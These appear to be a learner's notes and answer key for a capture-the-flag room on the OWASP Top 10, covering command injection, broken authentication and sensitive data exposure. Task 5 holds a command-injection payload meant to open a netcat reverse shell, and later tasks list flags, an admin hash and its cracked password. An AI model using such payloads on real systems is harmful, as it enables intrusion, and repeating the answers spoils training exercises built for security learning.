# OWASP Top 10

## [Task 1] Introduction

## [Task 2] Accessing machines

## [Task 3] Daily Prizes

## [Task 4] [Day 1] Injection

## [Task 5] [Day 1] OS Command Injection
- `whoami`
- `;nc -e /bin/bash`

## [Task 6] [Day 1] Command Injection Practical
Commands to try
Linux
- `whoami`
- `id`

- `ifconfig/ip addr`
- `uname -a`
- `ps -ef`

Windows
- `whoami`
- `ver`
- `ipconfig`
- `tasklist`
- `netstat -an`

1. What strange text file is in the website root directory?
  - drpepper.txt
2. How many non-root/non-service/non-daemon users are there?
  - 0
3. What user is this app running as?
  - www-data
4. What is the user's shell set as?
  - /usr/sbin/nologin
5. What version of Ubuntu is running?
  - 18.04.4
6. Print out the MOTD. What favorite beverage is shown?
  - dr pepper

## [Task 7] [Day 2] Broken Authentication

## [Task 8] [Day 2] Broken Authentication Practical
1. What is the flag that you found in darren's account?
  - fe86079416a21a3c99937fea8874b667
2. Now try to do the same trick and see if you can login as arthur.
3. What is the flag that you found in arthur's account?
  - d9ac0f7db4fda460ac3edeb75d75e16e

## [Task 9] [Day 3] Sensitive Data Exposure (Introduction)

## [Task 10] [Day 3] Sensitive Data Exposure (Supporting Material 1)

## [Task 11] [Day 3] Sensitive Data Exposure (Supporting Material 2)

## [Task 12] [Day 3] Sensitive Data Exposure (Challenge)
1. Have a look around the web app. The developer has left themselves a note
   indicating that there is sensitive data in a specific directory. What is the
   name of the mentioned directory?
  - /assets
2. Navigate to the directory you found in question one. What file stands out as
   being likely to contain sensitive data?
  - webapp.db
3. Use the supporting material to access the sensitive data. What is the
   password hash of the admin user?
  - 6eea9b7ef19179a06954edd0f6c05ceb
4. Crack the hash. What is the admin's plaintext password?
  - qwertyuiop
5. Login as the admin. What is the flag?
  - THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

